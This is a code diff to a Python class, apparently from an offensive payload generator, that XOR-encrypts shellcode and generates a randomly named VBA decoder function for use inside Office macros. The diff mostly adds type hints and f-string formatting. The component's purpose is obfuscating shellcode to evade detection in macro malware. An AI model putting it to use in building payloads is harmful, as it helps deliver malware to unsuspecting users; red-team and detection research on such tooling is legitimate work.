@@ -6,40 +6,40 @@ from itertools import cycle
 
 class XOREncrypt:
 
-    def __init__(self, arguments):
+    def __init__(self, arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
         if 'key' in arguments:
             self.key = arguments['key'].encode()
         else:
             self.key = os.urandom(16)
 
-    def compilerOptions(self):
+    def compilerOptions(self) -> list[str]:
         return []
 
-    def imports(self):
+    def imports(self) -> list[str]:
         return []
 
-    def codeblock(self):
-        return """
-Function {name}(ciphertext() As Byte) As Byte()
+    def encode(self, plaintext: bytes) -> bytes:
+        self.ciphertextSize = len(plaintext)
+        return bytes(plaintext[i] ^ self.key[i % len(self.key)] for i in range(0, len(plaintext)))
+
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
+
+    def codeblock(self) -> str:
+        return f"""
+Function {self.name}(ciphertext() As Byte) As Byte()
     Dim i As Long, n as Long
-    {key}
+    {bytes_to_vba(self.key, 'key')}
     Dim plaintext() as Byte
 
     n = Ubound(ciphertext)
     ReDim plaintext(0 To n)
 
     For i = 0 To n
-        plaintext(i) = ciphertext(i) Xor key(i Mod {keyLength})
+        plaintext(i) = ciphertext(i) Xor key(i Mod {len(self.key)})
     Next i
 
-    {name} = plaintext
+    {self.name} = plaintext
 End Function
-""".format(name = self.name, key=bytes_to_vba(self.key, 'key'), keyLength=len(self.key))
-
-    def encode(self, plaintext):
-        self.ciphertextSize = len(plaintext)
-        return bytes(plaintext[i] ^ self.key[i % len(self.key)] for i in range(0, len(plaintext)))
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
+"""
